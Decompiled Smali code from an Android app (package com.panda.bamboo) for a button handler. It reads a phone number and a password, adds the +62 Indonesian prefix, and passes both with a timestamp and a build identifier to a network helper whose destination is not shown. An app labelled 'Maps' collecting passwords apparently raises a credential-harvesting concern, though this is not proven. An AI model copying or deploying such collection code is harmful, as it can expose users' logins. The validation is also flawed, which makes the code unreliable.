.class Lcom/panda/bamboo/ah;
.super Ljava/lang/Object;
.source "SourceFile"

# interfaces
.implements Landroid/view/View$OnClickListener;


# instance fields
.field private final a:Lcom/panda/bamboo/Maps;

.field private final b:Landroid/widget/EditText;

.field private final c:Landroid/widget/EditText;

.field private final d:Landroidx/appcompat/app/r;


# direct methods
.method constructor <init>(Lcom/panda/bamboo/Maps;Landroid/widget/EditText;Landroid/widget/EditText;Landroidx/appcompat/app/r;)V
    .locals 0

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    iput-object p1, p0, Lcom/panda/bamboo/ah;->a:Lcom/panda/bamboo/Maps;

    iput-object p2, p0, Lcom/panda/bamboo/ah;->b:Landroid/widget/EditText;

    iput-object p3, p0, Lcom/panda/bamboo/ah;->c:Landroid/widget/EditText;

    iput-object p4, p0, Lcom/panda/bamboo/ah;->d:Landroidx/appcompat/app/r;

    return-void
.end method

.method static a(Lcom/panda/bamboo/ah;)Lcom/panda/bamboo/Maps;
    .locals 1

    iget-object v0, p0, Lcom/panda/bamboo/ah;->a:Lcom/panda/bamboo/Maps;

    return-object v0
.end method


# virtual methods
.method public onClick(Landroid/view/View;)V
    .locals 10
    .annotation runtime Ljava/lang/Override;
    .end annotation

    .prologue
    const/4 v9, 0x5

    const/4 v8, 0x1

    .line 205
    iget-object v0, p0, Lcom/panda/bamboo/ah;->b:Landroid/widget/EditText;

    invoke-virtual {v0}, Landroid/widget/EditText;->getText()Landroid/text/Editable;

    move-result-object v0

    invoke-interface {v0}, Landroid/text/Editable;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v0

    .line 206
    iget-object v1, p0, Lcom/panda/bamboo/ah;->c:Landroid/widget/EditText;

    invoke-virtual {v1}, Landroid/widget/EditText;->getText()Landroid/text/Editable;

    move-result-object v1

    invoke-interface {v1}, Landroid/text/Editable;->toString()Ljava/lang/String;

    move-result-object v1

    .line 207
    const-string v2, ""

    invoke-virtual {v0, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_0

    const-string v2, ""

    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_0

    .line 208
    iget-object v0, p0, Lcom/panda/bamboo/ah;->a:Lcom/panda/bamboo/Maps;

    const-string v1, "Cek Kolom"

    invoke-static {v0, v1, v8}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object v0

    invoke-virtual {v0}, Landroid/widget/Toast;->show()V

    .line 223
    :goto_0
    return-void

    .line 211
    :cond_0
    const-string v2, "[^0-9.]"

    const-string v3, ""

    invoke-virtual {v0, v2, v3}, Ljava/lang/String;->replaceAll(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 212
    const-string v2, "0"

    invoke-virtual {v0, v2}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v2

    if-eqz v2, :cond_1

    .line 213
    invoke-virtual {v0}, Ljava/lang/String;->length()I

    move-result v2

    invoke-virtual {v0, v8, v2}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v0

    .line 215
    :cond_1
    const-string v2, "+62"

    invoke-virtual {v0, v2}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v2

    if-nez v2, :cond_2

    .line 216
    new-instance v2, Ljava/lang/StringBuffer;

    invoke-direct {v2}, Ljava/lang/StringBuffer;-><init>()V

    const-string v3, "+62"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v2

    invoke-virtual {v2, v0}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuffer;->toString()Ljava/lang/String;

    move-result-object v0

    .line 220
    :cond_2
    invoke-static {}, Ljava/util/Calendar;->getInstance()Ljava/util/Calendar;

    move-result-object v2

    .line 221
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v4

    invoke-virtual {v2, v4, v5}, Ljava/util/Calendar;->setTimeInMillis(J)V

    .line 222
    const/16 v3, 0x1e

    invoke-virtual {v2, v9, v3}, Ljava/util/Calendar;->add(II)V

    .line 223
    iget-object v2, p0, Lcom/panda/bamboo/ah;->a:Lcom/panda/bamboo/Maps;

    new-instance v3, Lcom/panda/bamboo/ai;

    iget-object v4, p0, Lcom/panda/bamboo/ah;->d:Landroidx/appcompat/app/r;

    invoke-direct {v3, p0, v0, v1, v4}, Lcom/panda/bamboo/ai;-><init>(Lcom/panda/bamboo/ah;Ljava/lang/String;Ljava/lang/String;Landroidx/appcompat/app/r;)V

    const-string v4, ""

    const/16 v5, 0x8

    new-array v5, v5, [Ljava/lang/String;

    const/4 v6, 0x0

    const-string v7, "phone"

    aput-object v7, v5, v6

    aput-object v0, v5, v8

    const/4 v0, 0x2

    const-string v6, "password"

    aput-object v6, v5, v0

    const/4 v0, 0x3

    aput-object v1, v5, v0

    const/4 v0, 0x4

    const-string v1, "date"

    aput-object v1, v5, v0

    new-instance v0, Ljava/text/SimpleDateFormat;

    const-string v1, "yyyy-MM-dd HH:mm:ss"

    invoke-direct {v0, v1}, Ljava/text/SimpleDateFormat;-><init>(Ljava/lang/String;)V

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v6

    new-instance v1, Ljava/lang/Long;

    invoke-direct {v1, v6, v7}, Ljava/lang/Long;-><init>(J)V

    invoke-virtual {v0, v1}, Ljava/text/SimpleDateFormat;->format(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v0

    aput-object v0, v5, v9

    const/4 v0, 0x6

    const-string v1, "android_id"

    aput-object v1, v5, v0

    const/4 v0, 0x7

    sget-object v1, Landroid/os/Build;->ID:Ljava/lang/String;

    aput-object v1, v5, v0

    invoke-static {v2, v3, v4, v5}, Lcom/panda/bamboo/Maps;->a(Landroid/app/Activity;Lcom/panda/bamboo/bo;Ljava/lang/String;[Ljava/lang/String;)V

    goto/16 :goto_0
.end method
